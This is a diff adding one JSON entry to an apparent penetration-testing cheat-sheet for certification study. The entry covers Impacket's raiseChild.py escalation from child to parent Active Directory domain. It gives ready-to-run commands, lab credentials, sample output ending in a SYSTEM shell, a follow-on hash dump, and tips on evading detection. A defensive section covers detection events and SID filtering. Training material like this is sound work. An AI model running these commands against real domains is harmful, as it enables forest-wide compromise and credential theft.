@@ -1,0 +1,81 @@
+{
+  "id": "ad-raisechild",
+  "name": "raiseChild.py - Automated Child→Parent Escalation",
+  "command": "raiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin>:<password>",
+  "description": "Automates the entire child-to-parent domain escalation chain: DCSync child KRBTGT → enumerate SIDs → forge ExtraSids golden ticket → execute on parent DC. One command replaces the manual lookupsid + ticketer + psexec chain. Use when you have child domain admin and want fastest path to parent domain compromise.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Privilege Escalation",
+  "subcategory": "Domain Trusts",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "domain-trust",
+    "child-parent",
+    "extrasids",
+    "impacket",
+    "automation"
+  ],
+  "mitre": [
+    "T1134.005",
+    "T1558.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT RAISECHILD.PY DOES AUTOMATICALLY ===\nraiseChild.py automates the full ExtraSids escalation chain:\n  1. DCSync the child DC to get the child KRBTGT hash\n  2. Enumerate child domain SID\n  3. Enumerate parent domain SID (for Enterprise Admins = RID 519)\n  4. Forge a golden ticket with ExtraSids (parent EA SID in ticket)\n  5. Use that ticket to psexec the parent DC → get SYSTEM shell\n  6. DCSync the parent domain (dump all hashes)\n\nThe manual equivalent uses: secretsdump → lookupsid → ticketer → psexec\nraiseChild.py replaces all of that with one command.\n\n=== REQUIREMENTS ===\n  - Child domain admin or DA credentials\n  - Connectivity to both child DC (for initial DCSync) and parent DC (for final exec)\n  - -target-exec <parent_dc_ip> specifies where to execute on the parent side\n\n=== OUTPUT ===\n  [*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL\n  [*] Performing DCSync ...\n  [*] Got KRBTGT hash: <hash>\n  [*] Enumerating SIDs...\n  [*] Forging golden ticket with extra SID: S-1-5-21-...-519\n  [*] Executing on 172.16.5.5 ...\n  [!] Launching semi-interactive shell - Ctrl+C to abort\n  Microsoft Windows...\n  C:\\Windows\\system32> whoami\n  nt authority\\system\n\n=== WHEN TO USE MANUAL vs RAISECHILD ===\n  raiseChild.py: fastest, one command, exam time savings\n  Manual chain: when you need to inspect each step, save the ticket separately,\n                or when raiseChild fails (connectivity issues, DNS problems)\n\n=== AFTER GETTING PARENT DC SYSTEM ===\nsecretsdump.py -just-dc -outputfile parent_hashes INLANEFREIGHT/Administrator@172.16.5.5 -hashes :<nt_hash>",
+  "examples": [
+    {
+      "label": "Automated child→parent escalation",
+      "command": "raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm:HTB_@cademy_stdnt!"
+    },
+    {
+      "label": "With verbose output",
+      "command": "raiseChild.py -target-exec 172.16.5.5 -w hashes.txt LOGISTICS.INLANEFREIGHT.LOCAL/admin:pass"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket raiseChild.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/raiseChild.py"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-golden-ticket-mimikatz",
+      "rel": "next",
+      "note": "Leverage trust data for cross-domain forging."
+    }
+  ],
+  "defense": {
+    "why_it_works": "raiseChild.py chains the full ExtraSids escalation automatically: (1) DCSync the child DC to extract KRBTGT hash, (2) enumerate child and parent domain SIDs via LSARPC, (3) forge a golden ticket with the parent's Enterprise Admins SID (RID 519) in the ExtraSids field of the PAC, (4) use that ticket to authenticate to the parent DC via psexec — the parent KDC trusts the ticket because its inter-realm trust key validates the referral, and the ExtraSids field grants EA privileges.",
+    "prerequisites": "Child domain admin credentials (or DA). Network connectivity to both child DC (for DCSync) and parent DC (for final execution). DNS resolution or -target-exec IP for the parent DC. Impacket installed.",
+    "impact": "Fully automated child→parent forest escalation resulting in SYSTEM on the parent DC. From there: secretsdump of the entire parent domain, golden ticket for the parent, complete forest compromise. One command collapses what is normally a multi-step manual chain.",
+    "detection": "Generates all the same indicators as the manual chain simultaneously: Event 4662 (DCSync) on child DC, LSARPC SID enumeration traffic, cross-domain Kerberos referral with ExtraSids in PAC, Event 7045 (service install) on parent DC, Event 4624 type 3 on parent DC. MDI alerts on both DCSync and the cross-realm golden ticket. The multi-event burst from a single source IP in rapid succession is itself a strong SIEM indicator.",
+    "prevention": "Enable SID Filtering on the parent-child trust — this is the most direct mitigation (blocks ExtraSids from being honored). Note: disabling SID filtering on parent-child trusts breaks some legitimate cross-domain functionality; evaluate carefully. Reset KRBTGT passwords in all child domains to prevent DCSync data being used. Deploy MDI across all domains in the forest. Child domain compromise should trigger forest-wide incident response.",
+    "evasion": "The manual step-by-step approach (secretsdump → lookupsid → ticketer → psexec) is more controllable and allows pausing between steps, but generates the same fundamental indicators. raiseChild.py is an automated tool — less evasion-tunable than the manual chain. Use the manual chain when stealth matters; raiseChild.py when speed is priority.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1134.005",
+      "MITRE T1558.001"
+    ],
+    "misconfiguration": "Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications — but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.",
+    "vulnerable_config": "# Bidirectional forest trust without SID filtering:\nGet-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined\n# SIDFilteringQuarantined: False  <-- SID filtering DISABLED\n# Direction: BiDirectional        <-- both domains trust each other\n\n# Child domain to parent: SID filtering is always disabled by default\n# Enterprise Admin SID (S-1-5-21-<root>-519) can be added to ExtraSids\n# Golden ticket with ExtraSids = cross-domain privilege escalation",
+    "secure_config": "# Enable SID filtering on external/forest trusts:\nnetdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes\n# 'Quarantine' = SID filtering enabled — ExtraSids from other domain are stripped\n\n# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):\n# Use Selective Authentication instead of full trust\n# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust\nnetdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes\n\n# Restrict SIDHistory (prevents ExtraSids abuse):\n# Audit accounts with SIDHistory:\nGet-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory\n\n# Monitor cross-forest authentication:\n# Event 4769 on parent DC with ticket from child domain user"
+  },
+  "tools": [
+    "impacket"
+  ]
+}
